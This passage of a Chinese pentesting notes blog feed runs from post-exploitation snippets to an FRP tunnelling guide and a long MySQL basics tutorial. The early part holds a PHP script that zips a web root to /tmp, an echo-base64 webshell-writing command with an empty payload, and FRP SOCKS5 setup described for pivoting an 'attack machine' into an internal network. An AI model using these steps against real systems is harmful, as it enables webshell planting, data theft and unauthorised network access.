 if(is_dir($path.&quot;&#x2F;&quot;.$filename))&#123;&#x2F;&#x2F; 如果读取的某个对象是文件夹，则递归</span><br><span class="line">                addFileToZip($path.&quot;&#x2F;&quot;.$filename, $zip);</span><br><span class="line">            &#125;else&#123; &#x2F;&#x2F;将文件加入zip对象</span><br><span class="line">                $zip-&gt;addFile($path.&quot;&#x2F;&quot;.$filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @closedir($path);</span><br><span class="line">&#125;</span><br><span class="line">$zip&#x3D;new ZipArchive();</span><br><span class="line"></span><br><span class="line">if($zip-&gt;open(&#39;&#x2F;tmp&#x2F;backup.zip&#39;, ZipArchive::OVERWRITE)&#x3D;&#x3D;&#x3D; TRUE)&#123;</span><br><span class="line">    addFileToZip(&#39;&#x2F;www&#x2F;wwwroot&#x2F;&#39;, $zip); &#x2F;&#x2F;调用方法，对要打包的根目录进行操作，并将ZipArchive的对象传递给方法</span><br><span class="line">    $zip-&gt;close(); &#x2F;&#x2F;关闭处理的zip文件</span><br><span class="line">    echo 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linux通过echo写shell："><a href="#linux通过echo写shell：" class="headerlink" title="linux通过echo写shell："></a>linux通过echo写shell：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&quot; | base64 -d &gt; &#x2F;var&#x2F;www&#x2F;sehll.php</span><br></pre></td></tr></table></figure><h3 id="find命令："><a href="#find命令：" class="headerlink" title="find命令："></a>find命令：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -amin -10 # 查找在系统中最后10分钟访问的文件</span><br><span class="line">find &#x2F; -atime -2 # 查找在系统中最后48小时访问的文件</span><br><span class="line">find &#x2F; -empty # 查找在系统中为空的文件或者文件夹</span><br><span class="line">find &#x2F; -group cat # 查找在系统中属于 groupcat的文件</span><br><span class="line">find &#x2F; -mmin -5 # 查找在系统中最后5分钟里修改过的文件</span><br><span class="line">find &#x2F; -mtime -1 #查找在系统中最后24小时里修改过的文件</span><br><span class="line">find &#x2F; -nouser #查找在系统中属于作废用户的文件</span><br><span class="line">find &#x2F; -user fred #查找在系统中属于FRED这个用户的文件</span><br><span class="line">　　</span><br><span class="line"># 查找所有httpd.conf</span><br><span class="line">find &#x2F; -name httpd.conf</span><br><span class="line"># 查找所有.php文件</span><br><span class="line">find &#x2F; -name *.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="2020/10/13/frp-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>2020/10/13/frp-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/fatedier/frp">FRP</a> 全名：Fast Reverse Proxy。FRP 是一个使用 Go 语言开发的高性能的反向代理应用，可以轻松地进行内网穿透，对外网提供服务。FRP 支持 TCP、UDP、HTTP、HTTPS等协议类型，并且支持 Web 服务根据域名进行路由转发。  </p><p>frp有客户端和服务端，服务端放在有公网IP的机器上，客户端放在没有公网IP的内网机上。客户端和服务端都需要进行配置，frp给客户端和服务端都默认提供了两种配置文件，完整版：<a href="https://github.com/fatedier/frp/blob/master/conf/frps_full.ini">服务端</a> <a href="https://github.com/fatedier/frp/blob/master/conf/frpc_full.ini">客户端</a>  </p><h3 id="服务端简版："><a href="#服务端简版：" class="headerlink" title="服务端简版："></a>服务端简版：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看配置，默认配置中监听的是 7000 端口，可根据自己实际情况修改。</span><br><span class="line">$ cat frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 启动 FRP 服务端</span><br><span class="line">$ .&#x2F;frps -c .&#x2F;frps.ini</span><br></pre></td></tr></table></figure><p>通过上面简单的两步就可以成功启动一个监听在 7000 端口的 FRP 服务端。</p><h3 id="客户端简版："><a href="#客户端简版：" class="headerlink" title="客户端简版："></a>客户端简版：</h3><p>假设公网ip为4.3.2.1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 根据需求修改配置</span><br><span class="line">$ vim frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line"># server_addr 为 FRP 服务端的公网 IP</span><br><span class="line">server_addr &#x3D; 4.3.2.1</span><br><span class="line"># server_port 为 FRP 服务端监听的端口</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 启动 FRP 客户端</span><br><span class="line">$ .&#x2F;frpc -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><ul><li>访问内网ssh </li></ul><p>服务端配置frps.ini：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure><p>客户端配置frpc.ini【(假设公网ip(即服务端ip)为192.168.254.1】:  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.254.1</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure><p>然后服务端配置好之后在cmd（windows环境下）中输入：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frps.exe</span><br></pre></td></tr></table></figure><p>客户端配置好之后（linux环境下）输入：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frpc -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><p>在第三台电脑中输入<code>ssh -oPort=6000 kali@192.168.254.1</code>即可  </p><ul><li>frp代理内网 </li></ul><p>FRP 客户端内置了 http_proxy 和 socks5 插件，通过这两个插件都可以实现内网代理，这里以socks5为例<br>服务端配置frps.ini：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure><p>客户端配置frpc.ini:  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr &#x3D; 4.3.2.1</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 46075</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line"># 设置代码认证（可要可不要）</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; password</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>客户端和服务端都配置好之后运行frp，攻击机(第三台电脑)使用Proxifier进行代理设置(IP为vps-ip即4.3.2.1,端口为46075)即可。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>[<a href="https://www.anquanke.com/post/id/184855">FRP 内网穿透</a>]</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FRP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySql数据库基础</title>
      <link href="2020/09/23/MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
      <url>2020/09/23/MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="MySql数据库基础"><a href="#MySql数据库基础" class="headerlink" title="MySql数据库基础"></a>MySql数据库基础</h1><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>MySql的应用还没有很系统的总结过，就花时间重新总结了一下，内容可能也不是太全面，如有不对的地方，还请各位师傅纠正。</p><h3 id="0x01-SQL基础"><a href="#0x01-SQL基础" class="headerlink" title="0x01 SQL基础"></a>0x01 SQL基础</h3><h4 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据:是数据库总存储的基本对象</span><br><span class="line">定义:描述客观事物的符号记录</span><br><span class="line">种类:数字、文字、图形、图像、声音等</span><br><span class="line">数据库：DB 存储数据的集合</span><br><span class="line">数据库管理系统：DBMS</span><br><span class="line">用户和操作系统之间的一层数据管理软件</span><br><span class="line">科学地组织和存储数据、高效地获取和维护数据</span><br><span class="line">数据库系统：DBS</span><br><span class="line">计算机系统中引入数据库后的系统</span><br><span class="line">数据库管理员：DBA</span><br><span class="line"></span><br><span class="line">SQL：数据库查询语言</span><br><span class="line">DDL：数据定义语言</span><br><span class="line">DQL：数据查询语言</span><br><span class="line">DML：数据操作语言</span><br><span class="line">DCL：数据控制语言</span><br><span class="line">TPL：事物处理语言</span><br><span class="line">CCL：指针控制语言</span><br><span class="line"></span><br><span class="line">数据库包括</span><br><span class="line">16张表</span><br><span class="line">7个视图</span><br><span class="line">3个存储过程</span><br><span class="line">3个数据库函数</span><br></pre></td></tr></table></figure><h4 id="文件定义"><a href="#文件定义" class="headerlink" title="文件定义"></a>文件定义</h4><p>建库建表后，在data目录下产生了对应文件，不同文件类型的作用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.frm 是描述表结构的文件 可以直接打开</span><br><span class="line">.MYD 是表达数据文件</span><br><span class="line">.MYI 是表数据文件中任何索引的数据树</span><br><span class="line">.opt 记录字符集和字符序</span><br><span class="line">.IBD 是MySQL数据文件、索引文件 也叫独立表空间</span><br><span class="line">无法直接读取</span><br><span class="line">ibdata1 共享表空间</span><br><span class="line">undo 存储表空间</span><br><span class="line">.IDB 智能数据库系统 是一个对象数据库管理系统。</span><br><span class="line">.PAR 交换文件，主要是Windows环境下的文件名</span><br></pre></td></tr></table></figure><h4 id="文本格式区别"><a href="#文本格式区别" class="headerlink" title="文本格式区别"></a>文本格式区别</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式区别：</span><br><span class="line">char 是一种固定长度的类型，适合用在身份证号码、手机号码等定常的格式</span><br><span class="line">varchar 是一种可变长度的类型，适合用在长度可变的属性</span><br><span class="line">text 不设置长度，当不知道属性的最大长度时，适合用text</span><br><span class="line">查询速度：char牺牲了空间效率换取了时间效率。</span><br><span class="line">char 最快  存入的空格需要使用 trim()去除空格</span><br><span class="line">varchar 次之</span><br><span class="line">text 最慢</span><br></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 多行注释 *&#x2F;</span><br><span class="line"># 单行注释</span><br><span class="line">-- 单行注释(注意：两个但横线后面必须加空格)</span><br></pre></td></tr></table></figure><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>整形</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">​tinyint、smallint、mediumint、int、bigint</span><br><span class="line">​小整数值   大整数值   大整数值  大整数值  极大整数值</span><br></pre></td></tr></table></figure><p>浮点型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">​float、double</span><br></pre></td></tr></table></figure><p>小数型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">​decimal (常用：保证数据不丢失)</span><br><span class="line">​如：100.32-----》decimal(5,2)</span><br></pre></td></tr></table></figure><p>字符型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.char</span><br><span class="line">2.varchar</span><br><span class="line">3.text</span><br><span class="line">4.blob</span><br><span class="line">5.enum 枚举 （多选一）</span><br><span class="line">6.set （多选多）</span><br></pre></td></tr></table></figure><p>日期和时间</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.year </span><br><span class="line">2.date</span><br><span class="line">3.time</span><br><span class="line">4.datetime(5.5没有)</span><br><span class="line">5.timestamp 时间戳</span><br></pre></td></tr></table></figure><p>空和非空</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">空值 null 做为赋值可以用 &#x3D;  作为条件用is null进行判断</span><br><span class="line">非空 is not null 判断非空条件</span><br></pre></td></tr></table></figure><h4 id="基本语法-amp-amp-操作语句"><a href="#基本语法-amp-amp-操作语句" class="headerlink" title="基本语法&amp;&amp;操作语句"></a>基本语法&amp;&amp;操作语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create(创建)</span><br><span class="line">alter(更新)</span><br><span class="line">drop(删除)</span><br></pre></td></tr></table></figure><p>一次性删除一个表中所有的数据 包括日志</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">truncate table 表名;</span><br></pre></td></tr></table></figure><p>选中或者使用该数据库 说明接下来的操作都是针对该数据库进行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use 数据库名称</span><br></pre></td></tr></table></figure><p>创建</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建数据库TestDB</span><br><span class="line">create database 数据库名;</span><br><span class="line"></span><br><span class="line"># 创建数据表</span><br><span class="line">create table 数据表名(</span><br><span class="line">字段名 数据类型(长度) [其他值]，</span><br><span class="line">    字段名 数据类型(长度) [其他值]，</span><br><span class="line">    字段名 数据类型(长度) [其他值]，……</span><br><span class="line">);</span><br><span class="line">&#x2F;*</span><br><span class="line">create table 表名(</span><br><span class="line">字段名 类型 (长度) [是否为空] [有无默认值] [是否零填充] [是否无符号][约束设定]......</span><br><span class="line">);</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>更改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在表中修改字段</span><br><span class="line">ALTER TABLE 表名 MODIFY 字段名 VARCHAR(64) not null;</span><br><span class="line"># 修改表名</span><br><span class="line">rename table 表名 to 新表名;</span><br><span class="line">alter table 表名 rename 新表名;</span><br><span class="line"></span><br><span class="line"># 修改列名</span><br><span class="line">alter table 表名 change 字段名 新字段名;</span><br><span class="line"></span><br><span class="line">#更改表中数据</span><br><span class="line">update 表名 set 字段&#x3D;值[,字段2&#x3D;值2，……] where 条件表达式</span><br></pre></td></tr></table></figure><p>删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 删除数据库</span><br><span class="line">drop database 数据库名;</span><br><span class="line"></span><br><span class="line"># 删除数据表</span><br><span class="line">drop table 数据表名</span><br><span class="line"></span><br><span class="line"># 数据删除语句</span><br><span class="line">delete from 表名 [where 条件表达式];</span><br><span class="line"></span><br><span class="line"># 删除一个表中的所有数据 重置为初始状态</span><br><span class="line"># truncate ：不会对日志进行操作</span><br><span class="line">truncate table 数据表名;</span><br><span class="line"></span><br><span class="line"># 删除表中字段</span><br><span class="line">ALTER TABLE 表名 DROP 字段名;</span><br></pre></td></tr></table></figure><p>添加</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在表中添加字段</span><br><span class="line">ALTER TABLE 表名 ADD 字段名 字段数值参数;</span><br><span class="line"># 注意：向已经有数据的表中增加字段，建议该字段允许为空或设定默认值</span><br><span class="line"></span><br><span class="line"># 插入数据</span><br><span class="line">insert into 表名(字段列表) values (值列表);</span><br><span class="line"># 字段列表与值列表必须一一匹配（个数相同，顺序一致，类型兼容）</span><br><span class="line"># insert into 表名 values (),() 添加多条数据</span><br><span class="line"># 添加自动增长字段时，不添加可用defaul代替</span><br><span class="line"></span><br><span class="line">############添加数据来源于其他的表中############</span><br><span class="line"># 通过子查询添加数据 添加数据来源于其他表中</span><br><span class="line"># 这里不需要values</span><br><span class="line">INSERT into tc (select stu_name from stu_info);</span><br><span class="line"></span><br><span class="line"># 1.待添加数据的表存在的情况下 的语法</span><br><span class="line"> insert into 表名(字段列表) select 字段列表 from 表名 [where 条件表达式];</span><br><span class="line"> </span><br><span class="line"># 2. 待添加数据的表不存在的情况下的语法</span><br><span class="line"> create table 表名[(字段列表)] select 字段列表 from 表名 [where 条件表达式]；</span><br><span class="line"> </span><br><span class="line"># 不添加字段</span><br><span class="line"> create table 表名 select 字段列表 from 表名 [where 条件表达式]</span><br><span class="line"># 注意：平时创建表字段的时候字段名不相同会导致添加数据新建一个字段，需要通过as别名去改变字段的名字添加数据</span><br></pre></td></tr></table></figure><p>查询</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 子句：需要查询什么信息</span><br><span class="line">from 子句：操作的数据源在哪儿</span><br><span class="line"></span><br><span class="line"># 查询数据</span><br><span class="line">select [字段名],[...] from 表名 [where 条件表达式];</span><br><span class="line"></span><br><span class="line"># 查询一个表中所有数据</span><br><span class="line">select * from 表名;</span><br></pre></td></tr></table></figure><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>排序方式：    升序——asc（默认：从小到大）    降序——desc（由大到小）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 排序语法：</span><br><span class="line">order by 字段1 [asc]|desc[,字段2 [adc]|desc,……]</span><br></pre></td></tr></table></figure><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># limit 和排序结合起来用，取前面的多少条数据</span><br><span class="line"># 在limit后面只有一个数字时，表示在结果集中取前m条数据</span><br><span class="line"># 在limit后面有两个数字时，表示在结果集中取m+1开始取n条数据</span><br><span class="line">limit m[,n]</span><br><span class="line">select * form teachers order by tage desc limit 2;</span><br></pre></td></tr></table></figure><p>分页</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 分页</span><br><span class="line">limit (页码-1)*每页显示信息数，每页显示信息数;</span><br></pre></td></tr></table></figure><h4 id="group-by-分组"><a href="#group-by-分组" class="headerlink" title="group by:分组"></a>group by:分组</h4><p>Group By语句从英文的字面意义上理解就是“根据(by)一定的规则进行分组(Group)”。它的作用是通过一定的规则将一个数据集划分成若干个小的区域，然后针对若干个小区域进行数据处理。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># group by 字段名 having 条件表达式 分组查询</span><br><span class="line">select sName from elogs inner join students on sID &#x3D; sNo group by sNo having count(sid)&gt;&#x3D;2;</span><br><span class="line"></span><br><span class="line"># having 与 where 的不同之处</span><br><span class="line"># 1.执行顺序不同 having是在分组之后执行，where是在分组之前执行</span><br><span class="line"># 2.聚合函数的使用不同 having子句可以直接使用聚合函数，where子句不行</span><br><span class="line"></span><br><span class="line"># select 字段列表 from 表名 [where [条件表达式]] [group by 字段1,[字段2,……] [having 条件表达式]] [order by 字段1,[字段2,……] asc|[desc]][limit m,n];</span><br></pre></td></tr></table></figure><h4 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h4><p>子查询是一种常用计算机语言SELECT-SQL语言中嵌套查询下层的程序模块。当一个查询是另一个查询的条件时，称之为子查询。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 子查询的用法</span><br><span class="line"># 在字段</span><br><span class="line">select (select cName from courses where cNo &#x3D; cID) as &#39;课程名称&#39;, count(elNo) from elogs GROUP BY cID;</span><br><span class="line"></span><br><span class="line"># 在表</span><br><span class="line">select * from courses where exists(</span><br><span class="line">select * from (select sum(cCredit) as sumValue from courses where cNo in (</span><br><span class="line">select cID from elogs where sID &#x3D;&#39;20180001&#39; and elScore &gt;&#x3D;60</span><br><span class="line">)</span><br><span class="line">)as A where sumValue&lt;10) ;</span><br></pre></td></tr></table></figure><h4 id="多表连接查询"><a href="#多表连接查询" class="headerlink" title="多表连接查询"></a>多表连接查询</h4><p>注意：使用连接技术建议将表经行重命名！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># explain 检索连接是否达标</span><br><span class="line"># 内连接</span><br><span class="line"> # 语法1</span><br><span class="line">from 表1 inner join 表2 on 主键字段&#x3D;外键字段 [where 条件表达式]</span><br><span class="line"> # 语法2</span><br><span class="line"> from 表1,表2 where 主键字段&#x3D;外键字段 [ and 条件表达式]</span><br><span class="line"> # 三个表连接</span><br><span class="line">from 表1 inner join 表2 on 主键字段 &#x3D; 外键字段 inner join 表3 on 主键字段 &#x3D; 外键字段 [where 条件表达式];</span><br><span class="line"> </span><br><span class="line">from 表1,表2,表3 where 主键字段&#x3D;外键字段 and 主键字段 &#x3D; 外键字段 [ and 条件表达式];</span><br><span class="line"># 外连接outer join</span><br><span class="line"> # 左外连接 left outer join&#x2F;left join</span><br><span class="line"> # 右连接 right outer join&#x2F;right join</span><br></pre></td></tr></table></figure><h4 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">max()最大值</span><br><span class="line">min()最小值</span><br><span class="line">avg()平均值</span><br><span class="line">sum()求和</span><br><span class="line">count()符合条件数据的数目</span><br><span class="line"># 聚合函数不能嵌套使用</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在统计时字段内没有满足条件的数值只有count返回数值0或者其他，而其余四个聚合函数返回null;</span><br><span class="line"># 对于聚合函数的参数，很多时候使用字段名来表示，那么这个时候，该字段内的null值不参与统计</span><br><span class="line">count(*)</span><br></pre></td></tr></table></figure><p>显示表中符合条件的信息数目，不考虑某字段出现null值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(cID),avg(elScore) from elogs;</span><br><span class="line">select count(elNo),avg(elScore) from elogs;</span><br><span class="line">select count(1),avg(elScore) from elogs;</span><br><span class="line">select count(*),avg(elScore) from elogs;</span><br></pre></td></tr></table></figure><h4 id="转换编码"><a href="#转换编码" class="headerlink" title="转换编码"></a>转换编码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中文排序想要通过拼英排序的话需要转换编码</span><br><span class="line">convert (tName using gbk)</span><br></pre></td></tr></table></figure><h4 id="去重复值"><a href="#去重复值" class="headerlink" title="去重复值"></a>去重复值</h4> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># distinct 后面如果有多个字段，则是针对这些字段值组合后的去重</span><br><span class="line"> select distinct sID from Elogs;</span><br><span class="line"># 先去重，再统计</span><br><span class="line">select count(distinct cID) from Elogs;</span><br><span class="line"># &#x3D;号只有确定了一个值才能用  多条值用in</span><br></pre></td></tr></table></figure><h4 id="合并结果集"><a href="#合并结果集" class="headerlink" title="合并结果集"></a>合并结果集</h4><p>对合并后的结果集中的重复数据也会自动去重</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sName from students</span><br><span class="line">union</span><br><span class="line">select tName from Teachers;</span><br></pre></td></tr></table></figure><p>如果不想去重 则使用 union all</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sName from students</span><br><span class="line">union all</span><br><span class="line">select tName from Teachers;</span><br></pre></td></tr></table></figure><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>比较运算符：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;大于</span><br><span class="line">&lt;小于</span><br><span class="line">&gt;&#x3D;大于等于</span><br><span class="line">&lt;&#x3D;小于等于</span><br><span class="line">&#x3D; 等于</span><br><span class="line">!&#x3D;不等于</span><br></pre></td></tr></table></figure><p>范围运算符：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">between...and...(包含边界值) 类似于 &gt;&#x3D; and &lt;&#x3D;</span><br><span class="line">not between...and...(不包含边界值，表示不在指定范围内)</span><br></pre></td></tr></table></figure><p>集合运算符</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in(满足集合中任意一个值，即满足条件，就是多个or表达式)类似于 &#x3D; or &#x3D;</span><br><span class="line">not in(取值不在这个集合中)</span><br><span class="line"></span><br><span class="line">外部大于内部，建议使用in</span><br><span class="line">内部大于外部，建议使用exists</span><br><span class="line">exists 判断是否存在</span><br><span class="line">如果内部查询有数据，则外部执行：否则外部不执行</span><br></pre></td></tr></table></figure><h4 id="函数的应用"><a href="#函数的应用" class="headerlink" title="函数的应用"></a>函数的应用</h4><p>字符串截取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 从左边开始 第1个字符</span><br><span class="line">left(字段名,1)</span><br><span class="line"># 从那里开始，截取几个</span><br><span class="line">substring(字段名,1,1)</span><br></pre></td></tr></table></figure><p>str函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 连接字符串</span><br><span class="line">concat(s1,s2,s3,……,sn);</span><br><span class="line">concat_WS(&#39;sep&#39;,s1,s2,s3,……,sn);</span><br><span class="line"># 去除字符串首部和尾部的所有空格</span><br><span class="line">TRIM(str)</span><br><span class="line"># 去除leading里面的字符。</span><br><span class="line">TRIM(leading &#39;x&#39;,str)</span><br><span class="line"># 返回字符串 str ，顺序和字符顺序相反。</span><br><span class="line">REVERSE(str) </span><br><span class="line"># 返回字符串 str ，结尾空格字符被删去。</span><br><span class="line">RTRIM(str) </span><br><span class="line"># 从字符串str中切掉开头的空格</span><br><span class="line">LTRIM(str)</span><br><span class="line"></span><br><span class="line"># 判断是否相等 相等返回1 不等返回0</span><br><span class="line">select strcmp (s1,s2) </span><br><span class="line"></span><br><span class="line"># 保留小数</span><br><span class="line">select format(字段，格式化保留位数) from 表名 where [条件表达式];</span><br><span class="line"></span><br><span class="line"># 返回字段长度  返回中文长度</span><br><span class="line">select char_length(str);</span><br><span class="line"></span><br><span class="line"># 返回右边</span><br><span class="line">select right (str,len);</span><br><span class="line"></span><br><span class="line"># 替换</span><br><span class="line">select insert (原字符串,起始字符,替换字符)</span><br><span class="line"></span><br><span class="line"># 字符串从左边截取</span><br><span class="line">select left(str,len);</span><br><span class="line"># 返回长度 返回中文字符长度  1个字符&#x3D; 3个字节</span><br><span class="line">select length(set)</span><br><span class="line"></span><br><span class="line"># 截取长度 字符串 起始位置 截取长度</span><br><span class="line">select mid(str,pos,len)</span><br><span class="line"></span><br><span class="line"># 截取长度</span><br><span class="line">select substring() 比较常用</span><br><span class="line"></span><br><span class="line"># 替换 字符串 被替换 替换</span><br><span class="line">select replace(str,from_str,to_str)</span><br><span class="line"></span><br><span class="line"># 全局</span><br><span class="line">global </span><br><span class="line"></span><br><span class="line"># 转义字符\在mysql当中同样可取 三种方法</span><br><span class="line">&quot;McDonald&#39;s&quot;</span><br><span class="line">&#39;McDonald\&#39;s&#39;</span><br><span class="line">&#39;McDonald&#39;&#39;s&#39;</span><br><span class="line"></span><br><span class="line"># group_concat 将指定字段值拼凑成一字符串，每个数值之间使用逗号分隔</span><br><span class="line">group_concat(字段[str]);</span><br></pre></td></tr></table></figure><p>日期函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询星期几 由于索引是星期天开始，所以之后的需要加1</span><br><span class="line">select Dayofweek(&#39;2019-09-12&#39;);</span><br><span class="line"></span><br><span class="line"># 显示日期里面的值，后面的字符串表示 年月日时分秒都可</span><br><span class="line"># 大小写的值是不一样的</span><br><span class="line">date_format(date,format)</span><br><span class="line">select elDate,date_format(eldate,&#39;%y %m %d %h:%i:%s&#39;) from elogs</span><br><span class="line"></span><br><span class="line"># 返回过去的几天</span><br><span class="line">select DATE_SUB(Now(),INTERVAL 7 DAY);</span><br><span class="line"></span><br><span class="line"># 返回两个指定日期的时间和日期的边界天数</span><br><span class="line">select DATEDIFF(&#39;2019-09-12&#39;,&#39;2019-08-25&#39;);</span><br><span class="line"># 返回值：18</span><br></pre></td></tr></table></figure><h4 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.域完整性:---------匹配完整性：非空、缺省</span><br><span class="line">字段&#x2F;列</span><br><span class="line"></span><br><span class="line">2.实体完整性:-------匹配完整性：主键、唯一键</span><br><span class="line">记录&#x2F;行</span><br><span class="line"></span><br><span class="line">3.引用完整性:-------匹配完整性：外键</span><br><span class="line">表与表之间</span><br></pre></td></tr></table></figure><h4 id="约束-constraint"><a href="#约束-constraint" class="headerlink" title="约束:constraint"></a>约束:constraint</h4><p>MySQL中的约束分类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  主键:primary key</span><br><span class="line">  唯一键:unique</span><br><span class="line">  非空:not null</span><br><span class="line">  缺省:default</span><br><span class="line">  外键:foreign key</span><br><span class="line"></span><br><span class="line">主键、唯一键、外键都会自动创建索引</span><br><span class="line">主键:一个表只能有一个主键，其可以对应一个字段，也可以对应多个字段(组合主键)</span><br><span class="line">唯一键:也成为候选主键(跟主键的区别在于可以存储null值)</span><br><span class="line">外键:来源于主表的主键或唯一键(可允许为空，且其值必须在主表中出现过)</span><br></pre></td></tr></table></figure><p>创建约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">constraint 约束名 约束类型(字段名) references 主表(主键字段或唯一键字段)</span><br></pre></td></tr></table></figure><p>创建外键约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">constraint 约束名 foreign key(对应字段) references 主表(主键字段或唯一键字段)</span><br></pre></td></tr></table></figure><p>创建组合主键</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">primary key (字段1,字段2)</span><br></pre></td></tr></table></figure><p>对于已经存在的表，创建唯一键约束</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table 表名 add constraint 约束名 unique(字段名);</span><br></pre></td></tr></table></figure><p>删除约束的数据 先删除子表数据，再删除主表数据</p><p>级联删除</p><figure class="highlight 